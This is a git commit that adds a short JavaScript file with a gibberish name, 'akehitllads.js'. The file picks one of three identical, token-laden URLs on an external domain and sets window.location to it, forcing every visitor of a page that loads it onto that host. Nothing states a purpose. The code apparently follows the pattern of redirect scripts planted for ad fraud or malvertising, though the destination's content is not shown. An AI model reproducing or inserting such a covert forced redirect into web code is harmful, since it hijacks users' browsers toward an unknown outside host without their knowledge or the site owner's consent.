a91e6d864106f23e85d0dfd89172f6d509540255
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-04-01 23:14:35 +0700

    Create akehitllads.js

---
+++ akehitllads.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://wrathful-piano.com/bz3.Vm0SP/3VpuvcbcmnVTJXZqDa0j1HMMzgcu3BNVj/QGysLgT/U-z/N-zscP2gN/DHMl',
+'https://wrathful-piano.com/bz3.Vm0SP/3VpuvcbcmnVTJXZqDa0j1HMMzgcu3BNVj/QGysLgT/U-z/N-zscP2gN/DHMl',
+'https://wrathful-piano.com/bz3.Vm0SP/3VpuvcbcmnVTJXZqDa0j1HMMzgcu3BNVj/QGysLgT/U-z/N-zscP2gN/DHMl'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
